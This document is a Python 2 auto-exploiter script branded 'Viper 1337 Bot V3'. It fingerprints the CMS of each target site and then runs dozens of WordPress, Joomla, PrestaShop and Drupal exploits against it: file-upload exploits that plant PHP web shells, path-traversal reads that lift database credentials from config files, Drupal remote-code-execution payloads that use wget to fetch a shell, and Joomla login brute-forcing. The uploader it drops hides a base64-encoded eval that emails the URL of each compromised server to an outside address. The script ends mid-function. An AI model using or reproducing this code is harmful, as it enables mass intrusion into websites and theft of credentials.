import requests
import threading
from multiprocessing.dummy import Pool
import os,sys,time
from bs4 import BeautifulSoup
from platform import system
import urllib2
import urllib
import cookielib
os.path.exists('Sites')
import re
from colorama import Fore								
from colorama import Style								
from colorama import init												
init(autoreset=True)
fr  =   Fore.RED
fh  =   Fore.RED
fc  =   Fore.CYAN
fo  =   Fore.MAGENTA
fw  =   Fore.WHITE
fy  =   Fore.YELLOW
fbl =   Fore.BLUE
fg  =   Fore.GREEN											
sd  =   Style.DIM
fb  =   Fore.RESET
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT
import requests
if system() == 'Windows':
    os.system('cls')
elif system() == 'Linux':
    os.system('clear')
else:
    pass
l = ('''{}{}\t     /$$$$$$  /$$$$$$$$''').format(fh,sb)+('''{}{}/$$$$$$$$ /$$$$$$ ''').format(fg,sb)+('''{}{} /$$$$$$$  /$$$$$$''').format(fh,sb)
t = ('''{}{}\t    /$$__  $$|__  $$__/''').format(fh,sb)+('''{}{}|__ $$__//$$__  $$''').format(fg,sb)+('''{}{}| $$__  $$|_  $$_/''').format(fh,sb)
r = ('''{}{}\t   | $$  \ $$   | $$   ''').format(fh,sb)+('''{}{}  | $$  | $$  \ $$''').format(fg,sb)+('''{}{}| $$  \ $$  | $$ ''').format(fh,sb)
k = ('''{}{}\t   | $$$$$$$$   | $$   ''').format(fh,sb)+('''{}{}  | $$  | $$$$$$$$''').format(fg,sb)+('''{}{}| $$$$$$$/  | $$ ''').format(fh,sb)
s = ('''{}{}\t   | $$__  $$   | $$   ''').format(fh,sb)+('''{}{}  | $$  | $$__  $$''').format(fg,sb)+('''{}{}| $$__  $$  | $$ ''').format(fh,sb)
se= ('''{}{}\t   | $$  | $$   | $$   ''').format(fh,sb)+('''{}{}  | $$  | $$  | $$''').format(fg,sb)+('''{}{}| $$  \ $$  | $$ ''').format(fh,sb)
sk= ('''{}{}\t   | $$  | $$   | $$   ''').format(fh,sb)+('''{}{}  | $$  | $$  | $$''').format(fg,sb)+('''{}{}| $$  | $$ /$$$$$$''').format(fh,sb)
tm= ('''{}{}\t   |__/  |__/   |__/   ''').format(fh,sb)+('''{}{}  |__/  |__/  |__/''').format(fg,sb)+('''{}{}|__/  |__/|______/''').format(fh,sb)
logo = '\n'+l+'\n'+t+'\n'+r+'\n'+k+'\n'+s+'\n'+se+'\n'+sk+'\n'+tm
def nadafa():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
    else:
        pass
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
def intro(word,ok):
    nadafa()
    print '\n\n\n'
    print '\n\n\n'
    print '\n'
    #print logo
    #print '\n'
    print(ok)
    atx(word)
def nejmaf(site):
    print('{}{}[').format(fy,sb),('{}{}+').format(fg,sb),('{}{}]').format(fy,sb),('{}{}[Not Found...]').format(fr,sb),site
def nejmav(site):
    print('{}{}[').format(fy,sb),('{}{}+').format(fg,sb),('{}{}]').format(fy,sb),('{}{}[Found...]').format(fg,sb),site
def atx(s):
    for c in s + '\n':
        bb = ('{}{}'+c).format(fh,sb)
        sys.stdout.write(bb)
        sys.stdout.flush()
        time.sleep(4. / 60)

if system() == 'Windows':
    os.system('cls')
elif system() == 'Linux':
    os.system('clear')
else:
    pass
intro('\t\t\t     Coded By Viper 1337','')
nadafa()
print '\n\n\n'+logo+'\n\n'
print ('{}{}\t\t\t\t\t   ICQ: 744289868').format(fbl,sb)
print ('{}{}\t\t\t\t\t   Fb: https://fb.com/viper1337official/').format(fbl,sb)
print ('''{}{}

\t\t1) Run Viper 1337 Bot V3.
\t\t2) Filter Cms.
\t\t3) Get Ip's Servers From List Websites.
\t\t4) Grabber List Website From List Ip's Servers.
''').format(fy,sb)




if str(os.path.exists('Sites')) == 'False':
    os.system('mkdir Sites')
else:
    pass
if str(os.path.exists('Resultat')) == 'False':
    os.system('mkdir Resultat')
else:
    pass
shell = """<html>

    <head>
        <title>Uploader By Viper 1337</title>
	</head>
<body>
<br>
<br>
<br>
<br>
<br>
<br>
<br><br>
<body onload="window.focus();init();" onunload="halt();">
<body onLoad="writetext()" style="background:black;">
	<embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
	<table heigh="" width="800" border="20" align="center">
    <tbody><tr>
    <td valign="top" background=""><p id="MiSi" style="margin-left: 3px;">
<?php
$om= "ATT";
$ar= "ARI";
$atx = $om.$ar;
echo $atx;
echo "<font color='RED'</font><center><h1>$atx</h1></center>";
echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
if( $_POST['_upl'] == "Upload" ) { 
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
} 
?>
<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
?>
</html>
"""
filenames = 'attari' + '.php'

#Vulns Wordpress
revslider = "Revslider....................."
showbiz = "ShowBiz......................."
gravity = "Gravity Forms................."
wysija = "Wysija........................"
cherry = "cherry-plugin................."
formcraft = "Formcraft....................."
tev = "Tevolution...................."
w    = "wpshop........................"
p    = "purevision...................."
sym =  'wp-symposium..................'
noth=  'Wordpress Not Installed.......'
brut=  'Wordpress BruteForce..........'
#lfd
revconfig = "Revslider Config.............."
theme = "mTheme-Unus config............"
epic = "Epic config..................."
aspo = "Aspose Config................."


#Vuln Joomla
jdownloads = "JdownLoads...................."
jce = "Jce..........................."
syn = "Synoptic......................"
fabrik = "Com Fabrik Index.............."

fabrik1 = "Com Fabrik Shell.............."
foxcontact = "FoxContact...................."
adsmanager = "Adsmanager...................."
b2 = "b2jcontact...................."
myblog = "Myblog........................"
jb = "Jbcatalog....................."
fox = "FoxContact2..................."
sex = "Sexycontactform..............."
brt = "Joomla BruteForce............."
#lfd
jo = "joomanager config............."
hd = "hdflvplayer config............"
jw = "jw_allvideos Config..........."
xsim="simplefileupload.............."
cs = "cckjseblod Config............."
je = "jetext Config................."
php= "PHP Event Calendar............"
w2 = "Wordpress Not Installed2......"
joi = "Joomla Not Installed.........."
work="Work The Flow File Upload....."
cre ="Creative Contact Form........."
ds  ="dzs-zoomsounds................"
inb ="InBoundio Marketing..........."
slid="SlideShowpro.................."
simp="Simple Ads Manager............"
powe="Power Zoomer.................."
cat ="Catpro........................"
bl  ="Blaze........................."
down="levoslideshow................."
faci="facileforms..................."
bib ="biblestudy...................."
#jjj "simplephotogallery............"


class new_wordpress():
    def wpmbl(self,i):
        url = i+ "/wp-content/plugins/wp-mobile-detector/resize.php?src=https://gist.githubusercontent.com/taterbase/2688850/raw/b9d214c9cbcf624e13c825d4de663e77bf38cc14/upload.php"
        shell = i + "/wp-content/plugins/wp-mobile-detector/cache/upload.php"
        r =requests.get(url,headers=user)
        ck = requests.get(shell,headers=user)
        if 'Upload your files' in ck.content:
            success("wp-mobile-detector...........")
            with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed("wp-mobile-detector...........",i)

    def jsr(self,i):
        shell = i + '/wp-content/jssor-slider/jssor-uploads/atx.phtml'
        url = i+ '/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library'
        filename = open('files/atx.phtml','rb')
        files = {'file':filename}
        r = requests.post(url,files=files,headers=user)
        ok = requests.get(shell,headers=user)
        if 'ATTARI' in ok.content:
            success("jssor-slider..................")
            with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed("jssor-slider..................",i)
    def sydney(self,i):
        filename = open('files/bb.jpg','rb')
        data = {"form_id" : "../../../",
                "name" : "atx.phtml",
                "gform_unique_id" : "../../",
                "field_id" : ""
                }
        files = {"file":filename}
        r = requests.post(i+'/?gf_page=upload',files=files,data=data,headers=user)
        shell = i + '/_input__atx.phtml'
        b = requests.get(shell,headers=user)
        if 'ATTARI' in b.content:
            success("Sydney........................")
            with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
        else:
            failed("Sydney........................",i)

nve = new_wordpress()



            



def facil(i):
	link = i + '/components/com_facileforms/libraries/jquery/uploadify.php'
	filename = open('files/up.php','rb')
	files = {'Filedata':filename}	
	shell = i +'/components/com_facileforms/libraries/jquery/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
            success("facileforms...................")
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed("facileforms...................",i)



def simplefile(i):
	link = i + '/modules/mod_simplefileuploadv1.3/elements/udd.php'
	filename = open('files/up.php','rb')
	files = {'file':filename}
	shell = i +'/modules/mod_simplefileuploadv1.3/elements/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success("simplefileupload..............")
	    with open('Resultat/Sh3llz.txt','a') as cr:
                cr.writelines(shell+'\n')
        else:
            failed("simplefileupload..............",i)


def download(i):
	link = i + '/wp-admin/admin.php?page=levoslideshow_manage'
	filename = open('files/up.php','rb')
	files = {'album_img':filename}
	shell = i +'/wp-content/uploads/levoslideshow/1_uploadfolder/big/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success("levoslideshow.................")
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed("levoslideshow.................",i)


def blaze(i):
	link = i + '/wp-admin/admin.php?page=blaze_manage'
	filename = open('files/up.php','rb')
	files = {'album_img':filename}
	shell = i +'/wp-content/uploads/blaze/1_uploadfolder/big/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(bl)
	    with open('Resultat/Sh3llz.txt','a') as cr:
                cr.writelines(shell+'\n')
	else:
	    failed(bl,i)

def pro(i):
	link = i + '/wp-admin/admin.php?page=catpro_manage'
	filename = open('files/up.php','rb')
	files = {'album_img':filename}
	shell = i +'/wp-content/uploads/catpro/1_uploadfolder/big/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(cat)
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed(cat,i)

def power(i):
	link = i + '/wp-admin/admin.php?page=powerzoomer_manage'
	filename = open('files/up.php','rb')
	files = {'album_img':filename}
	shell = i +'/wp-content/uploads/powerzoomer/1_uploadfolder/big/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(powe)
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
    	else:
            failed(powe,i)


def sim(i):
	link = i + '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
	filename = open('files/up.php','rb')
	files = {'uploadfile':filename}
	shell = i +'/wp-content/plugins/simple-ads-manager/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(simp)
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
	else:
            failed(simp,i)


def sli(i):
	link = i + '/wp-admin/admin.php?page=slideshowpro_manage'
	filename = open('files/up.php','rb')
	files = {'album_img':filename}
	shell = i +'/wp-content/uploads/slideshowpro/1_uploadfolder/big/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(slid)
	    with open('Resultat/Sh3llz.txt','a') as cr:
    		cr.writelines(shell+'\n')
	else:
            failed(slid,i)

def In(i):
	link = i + '/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php'
	filename = open('files/up.php','rb')
	files = {'file':filename}
	shell = i +'/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(inb)
	    with open('Resultat/Sh3llz.txt','a') as cr:
		cr.writelines(shell+'\n')
	else:
	    failed(inb,i)



def dzs(i):
	link = i + '/wp-content/plugins/dzs-zoomsounds/admin/upload.php'
	filename = open('files/up.php','rb')
	files = {'file_field':filename}
	shell = i +'/wp-content/plugins/dzs-zoomsounds/admin/upload/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(ds)
	    with open('Resultat/Sh3llz.txt','a') as cr:
		cr.writelines(shell+'\n')
	else:
	    failed(ds,i)


def cr(i):
	link = i + '/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
	filename = open('files/up.php','rb')
	files = {'files[]':filename}
	shell = i +'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(cre)
	    with open('Resultat/Sh3llz.txt','a') as cr:
		    cr.writelines(shell+'\n')
	else:
	    failed(cre,i)


def work(i):
	link = i + '/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
	filename = open('files/up.php','rb')
	files = {'files[]':filename}
	shell = i +'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success("Work The Flow File Upload.....")
	    with open('Resultat/Sh3llz.txt','a') as cr:
		cr.writelines(shell+'\n')
	else:
            failed("Work The Flow File Upload.....",i)



def php(i):
	link = i + '/wp-content/plugins/php-event-calendar/server/file-uploader/'
	filename = open('files/up.php','rb')
	files = {'files[]':filename}
	shell = i +'/wp-content/plugins/php-event-calendar/server/file-uploader/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success("PHP Event Calendar............")
	    with open('Resultat/Sh3llz.txt','a') as cr:
                cr.writelines(shell+'\n')
	else:
	    failed("PHP Event Calendar............",i)


asp = "/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php"
ep = "/wp-content/themes/epic/includes/download.php?file=wp-config.php"
hdf = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
the = '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
rev = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
joom = "/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
al = "/plugins/content/jw_allvideos/includes/download.php?file=./../.../configuration.php"
ck = "/index.php?option=com_cckjseblod&task=download&file=configuration.php"






race= []
user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
bb = ('{}{}[').format(fbl,sb)+('{}{}+').format(fy,sb)+('{}{}]').format(fbl,sb)
def success(name):
    print bb,('{}{}'+name).format(fb,sb)+('{}{}|').format(fg,sn)+('{}{}Success...').format(fg,sb)+('{}{}]==>').format(fg,sn)

def failed(name,i):
    print bb,('{}{}'+name).format(fb,sb)+('{}{}|').format(fg,sn)+('{}{}Failed....').format(fr,sb)+('{}{}]==>').format(fg,sn),('{}{}'+i).format(fo,sn)
def message():
    if system() == 'Windows':
        os.system('cls')
    elif system() == 'Linux':
        os.system('clear')
    else:
        pass
    print'\n\n\n\n\n\n\n\n'
    print bb,'===> Message From Viper 1337 : The Hacker Make Tool Not Tool Make Hacker'
    print'\n\n\n\n\n\n\n\n'

up = """echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
if( $_POST['_upl'] == "Upload" ) { 
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
} 
?>"""
import codecs,sys
def conf(de):
    with open('Resultat/Config.txt','a') as co:
        co.writelines(de+'\n')
def c():
    with open('Resultat/Config.txt','a') as co:
        co.writelines(de+'\n')

    	
def joomlabrute(site, user, passwd):
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	cj = cookielib.LWPCookieJar()
	br.set_cookiejar(cj)
	wordpress = site + 'administrator/index.php'
	wordpress1 = br.open(wordpress)
	br.select_form(nr=0)
	br.form['username'] = user 
	br.form['passwd'] = passwd
	br.submit()
	#br.submit()
	html = br.response().readlines()
	for line in html:
            if re.findall('<span class="logo">', line):
                success(brt)
	    	with open('Resultat/Joomla_cracked.txt','a') as cr:
                    cr.writelines('==>Cracked '+i+'user: '+user+' pws: '+passwd+'\n')
            else:
                failed(brt,i)

def syno(i):
	link = i + '/wp-content/themes/synoptic/lib/avatarupload/upload.php'
	filename = open('files/up.php','rb')
	files = {'qqfile':filename}
	shell = i +'/wp-content/uploads/markets/avatars/up.php'
	r = requests.post(link,files=files,headers=user)
	e = requests.get(shell,headers=user)
	if 'ATTARI' in e.content:
	    success(syn)
	    with open('Resultat/Sh3llz.txt','a') as cr:
                cr.writelines(shell+'\n')
	else:
            failed(syn,i)

def config(exploit,name):
    vuln = exploit
    conf = i+vuln
    r = requests.get(conf)
    ok = r.content
    if 'DB_USER' in ok:
        conf(conf)
        success(name)
        speed = ok.split('define')
        for c in speed:
            if 'DB_USER' in c:
                c = c.replace('/** MySQL database password *','')
                c = c.replace('/** Database Charset to use in creating database tables. */','')
                c = c.replace('/** MySQL hostname */','')
                conf(c)
            elif 'DB_PASSWORD' in c:
                conf(c)
            elif 'DB_HOST' in c:
                conf(c)
            else:
                pass
    else:
        failed(name,i)
def vuln_presta(i,name,exploit,param,shell):
    vuln = i+exploit
    files = {param:open('files/up.php','rb')}
    r = requests.post(vuln,files=files)
    f = requests.get(i+shell)
    if 'ATTARI' in f.content:
        success(name)
        with open('Resultat/Sh3llz.txt','a') as pr:
            pr.writelines(i+shell+'\n')
    else:
        failed(name,i)

def runprestashop(i):
    vuln_presta(i,'columnadverts.................','/modules/columnadverts/uploadimage.php','userfile','/modules/columnadverts/slides/up.php')
    vuln_presta(i,'soopamobile...................','/modules/soopamobile/uploadimage.php','userfile','/modules/soopamobile/slides/up.php')
    vuln_presta(i,'soopabanners..................','/modules/soopabanners/uploadimage.php','userfile','/modules/soopabanners/slides/up.php')
    vuln_presta(i,'vtermslideshow................','/modules/vtermslideshow/uploadimage.php','userfile','/modules/vtermslideshow/slides/up.php')
    vuln_presta(i,'simpleslideshow...............','/modules/simpleslideshow/uploadimage.php','userfile','/modules/simpleslideshow/slides/up.php')
    vuln_presta(i,'productpageadverts............','/modules/productpageadverts/uploadimage.php','userfile','/modules/productpageadverts/slides/up.php')
    vuln_presta(i,'homepageadvertise.............','/modules/homepageadvertise/uploadimage.php','userfile','/modules/homepageadvertise/slides/up.php')
    vuln_presta(i,'homepageadvertise2............','/modules/homepageadvertise2/uploadimage.php','userfile','/modules/homepageadvertise2/slides/up.php')
    vuln_presta(i,'jro_homepageadvertise.........','/modules/jro_homepageadvertise/uploadimage.php','userfile','/modules/jro_homepageadvertise/slides/up.php')
    vuln_presta(i,'attributewizardpro............','/modules/attributewizardpro/file_upload.php','userfile','/modules/attributewizardpro/file_uploads/up.php')
    vuln_presta(i,'attributewizardpro2...........','/modules/1attributewizardpro/file_upload.php','userfile','/modules/1attributewizardpro/file_uploads/up.php')
    vuln_presta(i,'attributewizardpro3...........','/modules/attributewizardpro.OLD/file_upload.php','userfile','/modules/attributewizardpro.OLD/file_uploads/up.php')
    vuln_presta(i,'attributewizardpro_x..........','/modules/attributewizardpro_x/file_upload.php','userfile','/modules/attributewizardpro_x/file_uploads/up.php')
    vuln_presta(i,'fieldvmegamenu................','/modules/fieldvmegamenu/ajax/upload.php','images[]','/modules/fieldvmegamenu/uploads/up.php')
    vuln_presta(i,'pk_flexmenu...................','/modules/pk_flexmenu/ajax/upload.php','images[]','/modules/pk_flexmenu/uploads/up.php')
    vuln_presta(i,'nvn_export_orders.............','/modules/nvn_export_orders/upload.php','images[]','/modules/nvn_export_orders/up.php')
    vuln_presta(i,'tdpsthemeoptionpanel..........','/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php','image_upload','/modules/tdpsthemeoptionpanel/upload/up.php')
    vuln_presta(i,'psmodthemeoptionpanel.........','/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php','image_upload','/modules/psmodthemeoptionpanel/upload/up.php')
    vuln_presta(i,'lib...........................','/modules/lib/redactor/file_upload.php','file','/masseditproduct/uploads/file/up.php')
    vuln_presta(i,'1attributewizardpro...........','/modules/1attributewizardpro/file_upload.php','userfile','/modules/1attributewizardpro/file_uploads/up.php')
    vuln_presta(i,'cartabandonmentpro............','/modules/cartabandonmentpro/upload.php','image','/modules/cartabandonmentpro/uploads/up.php')
    vuln_presta(i,'nvn_export_orders.............','/modules/nvn_export_orders/upload.php','images[]','/modules/nvn_export_orders/up.php')
    
    ink = i + '/modules/fieldvmegamenu/ajax/upload.php'
    files = {'images[]': open('files/up.php', 'rb')}
    requests.post(ink, files=files)
    check = requests.get(i+'/modules/fieldvmegamenu/uploads/up.php')
    if 'ATTARI' in check.content:
        success('fieldvmegamenu................')
        with open('Resultat/Sh3llz.txt','a') as pr:
            pr.writelines(i+'/modules/fieldvmegamenu/uploads/up.php'+'\n')
    else:
        failed('fieldvmegamenu................',i)

    #wgt
    ink = i + '/modules/wg24themeadministration/wg24_ajax.php'
    data = {'data': 'bajatax',
            'type': 'pattern_upload'}
    files = {'bajatax': open('files/up.php', 'rb')}
    requests.post(ink, files=files,data=data)
    check = requests.get(i+'/modules/wg24themeadministration/img/upload/up.php')
    if 'ATTARI' in check.content:
        success('wg24themeadministration.......')
        with open('Resultat/Sh3llz.txt','a') as pr:
            pr.writelines(i+'/modules/wg24themeadministration/img/upload/up.php'+'\n')
    else:
        failed('wg24themeadministration.......',i)

v8 = "Rce Drupal v8................."
v7 = "Rce Drupal v7................."

atx = raw_input(('\t        '+bb+('{}{} Give Me Your Selection: ').format(fb,sb)))

def ATTARI(i):
    try:
    #if True:
        i = i.rstrip()
        wordpress = i+'/wp-login.php'
        joomla = i+'/administrator'
        drupal = i +'/user/login'
        dr = requests.get(drupal,headers=user)
        rb = requests.get(wordpress,headers=user)
        jo = requests.get(joomla ,headers=user)
        pr = requests.get(i,headers=user)
        pre = 'Prestashop' in pr.content or 'prestashop' in pr.content or 'PrestaShop' in pr.content
        drup = dr.content
        #print ''
    #filter joomla
        
        race.append(i)
        print ('{}{}Total Website Tested Now Is    : ').format(fg,sn),('{}{}('+str(len(race))+') ').format(fb,sb)
        lk = i+'/wp-admin/setup-config.php'
        r = requests.get(lk,headers=user)
        if 'Setup Configuration File' in r.content:
            success(w2)
            with open('Resultat/wpinstall.txt','a') as wo:
                wo.writelines(i+'/wp-admin/setup-config.php'+'\n')
        else:
            failed(w2,i)
        lien = i + '/wp-admin/install.php'
        r = requests.get(lien,headers=user)
        if 'install.php?step=2' in r.content:
            success(noth)
            with open('Resultat/Wordpress_Not_Installed.txt','a') as te:
                te.writelines(lien+'\n')
        else:
            failed(noth,i)
        lien = i + '/installation/index.php'
        r = requests.get(lien,headers=user)
        if 'Configuration principal' in r.content:
            success(joi)
            with open('Resultat/Joomla_Not_Installed.txt','a') as te:
                te.writelines(lien+'\n')
        else:
            failed(joi,i)

        if pre:
        #if True:
            with open('Sites/PrestaShop.txt','a') as o:
            	o.writelines(i+'\n')
            runprestashop(i)
        #drupal
        elif 'drupal' in drup or 'Drupal' in drup or 'drupal' in pr.content or 'Drupal' in pr.content:
            
            with open('Sites/Drupal.txt','a') as d:
            	d.writelines(i+'\n')

            test = i + '/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            shell = "ATTARI <?php system($_GET['cmd']); ?>"
            files = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                            'mail[#type]': 'markup', 'mail[#markup]': 'echo "' +shell + '"> attari.php'}
            e = requests.post(test, data=files)
            r = requests.get(i+'/attari.php')
            if "ATTARI" in r.content:
                success(v8)
                with open('Resultat/Sh3llz.txt','a') as v:
                    v.writelines(i+'/attari.php'+'\n')
            else:
                failed(v8,i)
            #version7drupal
            shell = "ATTARI <?php system($_GET['cmd']); ?>"
            data = "echo '<center><h1>Hacked By ATTARI</h1></center>' > attari.htm;" \
                   " echo '" + shell + "'> sites/default/files/attari.php;" \
                   " echo '" + shell + "'> attari.php;" \
                   " cd sites/default/files/;" \
                   " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                   " wget 'https://raw.githubusercontent.com/04x/ICG-AutoExploiterBoT/master/files/up.php'"
            param = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                     'name[#markup]': data, 'name[#type]': 'markup'}
            files = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
            r = requests.post(i, data=files, params=param)
            check = requests.get(i + '/sites/default/files/attari.php')
            if "ATTARI" in check.content:
                success(v7)
                with open('Resultat/Sh3llz.txt','a') as vv:
                    vv.writelines(i+'/sites/default/files/attari.php'+'\n')
                with open('Resultat/Index.txt','a') as vv:
                    vv.writelines(i+'attari.htm'+'\n')
            else:
                failed(v7,i)








        elif 'joomla' in jo.content or 'Joomla!' in jo.content:
        #elif True:
            #print('')
            with open('Sites/Joomla.txt','a') as jo:
                jo.writelines(i+'\n')
            #mass
            simplefile(i)
            facil(i)
            
            #b2

            vuln_url = i+'/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&qqfile=/../../../'+filenames
            req_b2j = requests.post(vuln_url, data=up)
            check_lib = requests.get(i+'/components/'+filenames)
            if 'ATTARI' in check_lib.content:
                success(b2)
                shell = i+'/components/'+filenames
                with open('Resultat/Sh3llz.txt','a') as jo:
                    jo.writelines(shell+'\n')
            else:
                failed(b2,i)
            #jce
            shell ="files/bb.jpg"
            files = {'Filedata': open(shell, 'rb')}
            data = {'upload-dir': '/', 'upload-overwrite': '0', 'action': 'upload'}
            url = i +'/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
            r = requests.post(url,files=files,headers=user,data=data)
            bypass = '"text":"bb.jpg"'
            if bypass in r.text.encode('utf-8'):
                #print 'hbib'
                Priv = {'json': "{\"fn\":\"folderRename\",\"args\":[\"/" + "bb.jpg"+ "\",\"./../../images/attari.php\"]}"}
                priv = i+ '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=156&format=raw'
                re = requests.post(priv, data=Priv)
                check = requests.get(i+"/images/attari.php",headers=user)
                
                if "ATTARI" in check.content:
                    success(jce)
                    with open('Resultat/Sh3llz.txt','a') as jo:
                        shell = i+"/images/attari.php"
                        jo.writelines(shell+'\n')
                else:
                    failed(jce,i)
            else:
                failed(jce,i)
            #joomla brute force
            #fabrik index
            url = i+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
            filename = open("files/attari.html",'rb')
            files = {"file": filename}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
            r = requests.post(url,files=files,headers=user)
            if 'attari.html' in r.content:
                vuln = i+'/attari.html'
                success(fabrik)
                with open('Resultat/Index.txt','a') as fa:
                    fa.writelines(vuln+'\n')
            else:
                failed(fabrik,i)
            #fabrik shell
            url = i+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
            filename = open("files/up.php",'rb')
            files = {"file": filename}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
            r = requests.post(url,files=files,headers=user)
            if 'up.php' in r.content:
                vuln = i+'/up.php'
                success(fabrik1)
                with open('Resultat/Sh3llz.txt','a') as fa:
                    fa.writelines(vuln+'\n')
            else:
                failed(fabrik1,i)
                
            #jdownoads
            
            #foxcontact
            vuln = (i+'/components/com_foxcontact/lib/file-uploader.php')
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
            r = requests.get(vuln,headers=user)
            html = r.content
            if '{"error"' in html:
                success(foxcontact)
                with open('Resultat/foxcontact_Vulns.txt','a') as fox:
                    fox.writelines(vuln+'\n')
                    #cid
